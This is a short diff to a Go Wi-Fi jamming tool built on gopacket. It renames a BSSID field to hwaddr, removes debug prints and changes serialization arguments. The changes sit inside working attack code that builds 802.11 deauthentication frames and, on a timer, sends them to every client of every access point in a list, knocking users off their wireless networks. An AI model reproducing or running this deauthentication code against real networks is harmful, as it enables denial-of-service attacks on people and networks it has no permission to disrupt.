@@ -147,7 +147,7 @@ func (conn *JamConn) SetFilterForTargets() error {
 	//var ln = len(targetList) - 1
 
 	//for _, v := range targetList {
-	//	bpfExpr = bpfExpr + fmt.Sprintf("ether host %s", v.BSSID.String())
+	//	bpfExpr = bpfExpr + fmt.Sprintf("ether host %s", v.hwaddr.String())
 	//	if i < ln {
 	//		i++
 	//		bpfExpr = bpfExpr + " or "
@@ -310,11 +310,9 @@ func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) er
 	if time.Since(conn.lastDeauth) > timeout {
 		for _, v := range apList.contents {
 			sta := v.(Station)
-			fmt.Println("station:", sta)
 			for _, cli := range sta.Clients {
-				fmt.Println("client:", cli)
-				if err := conn.Deauth(&cli, sta.BSSID); err != nil {
-					return errors.New("JamConn.Deauth " + err.Error())
+				if err := conn.Deauth(&cli, sta.hwaddr); err != nil {
+					return errors.New("JamConn.Deauth() " + err.Error())
 				}
 			}
 		}
@@ -332,13 +330,13 @@ func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
 	dot11Cpy := client.dot11
 	dot11Cpy.SequenceNumber += 1
 	dot11Cpy.Type = layers.Dot11TypeMgmtDeauthentication
-	mgmt := layers.Dot11MgmtDeauthentication{
+	mgmt := layers.Dot11MgmtDeauthentication {
 		Reason: layers.Dot11ReasonDeauthStLeaving,
 	}
 	buff = gopacket.NewSerializeBuffer()
 	err := gopacket.SerializeLayers(buff, opts,
-		client.radioHdr,
-		dot11Cpy,
+		&client.radioHdr,
+		&dot11Cpy,
 		&mgmt,
 	)
 	if err != nil {
